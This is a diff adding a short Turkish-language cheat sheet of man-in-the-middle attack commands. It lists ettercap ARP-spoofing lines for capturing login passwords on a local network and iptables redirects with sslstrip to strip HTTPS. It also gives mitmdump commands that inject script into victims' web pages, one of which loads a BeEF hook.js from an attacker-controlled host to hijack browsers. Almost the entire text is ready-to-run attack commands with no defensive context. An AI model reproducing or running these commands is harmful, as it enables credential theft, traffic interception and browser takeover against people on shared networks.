@@ -1,0 +1,29 @@
+-------------------------------
+-------------------------------
+LOGİN ŞİFLRELERİNİ ALMA
+
+sudo ettercap -Tq -M arp:remote -i wlan0 /192.168.1.1// /192.168.1.108//
+sudo ettercap -Tq -M arp:remote -i wlan0 /192.168.1.1// /192.168.1.108-200// == 200 e kadar olan ip adreslerine
+sudo ettercap -Tq -M arp:remote -i wlan0 /192.168.1.1// /192.168.1.108, 192.168.1.110// == 2 veya daha fazla saldırı
+-------------------------------
+-------------------------------
+HTTPS SİTELER MITM
+
+sudo iptables -t nat -A PREROUTING -p tcp --destination-port 80 -j REDIRECT --to-port 8080 && sslstrip. Sonrasında yukarıyı çalıştır
+-------------------------------
+-------------------------------
+kod enjeksiyonu
+
+ilk olarak "sudo ettercap -Tq -M arp:remote -i wlan0 -S /192.168.1.1// /192.168.1.108//" çalıştır sonra bi alttakini
+
+./mitmdump --mode transparent --modify-body :~s:"</body>":"<script>alert('i hack u');</script></body>"
+./mitmweb --mode transparent == bu da grafik arayüzü ama gerek yok
+sudo iptables -t nat -A PREROUTING -p tcp --destination-port 80 -j REDIRECT --to-port 8080
+-------------------------------
+-------------------------------
+Beef enjeksiyonu
+
+ilk olarak beefi çalıştırıyoruz
+ardından sudo ettercap -Tq -M arp:remote -i wlan0 -S /192.168.1.1// /192.168.1.108// bunu çalıştırıyoruz
+sonrasında bunu çalıştırıyoruz ./mitmdump --mode transparent --modify-body :~s:"</body>":"<script src="http://192.168.1.125:3000/hook.js"></script></body>"
+sudo iptables -t nat -A PREROUTING -p tcp --destination-port 80 -j REDIRECT --to-port 8080
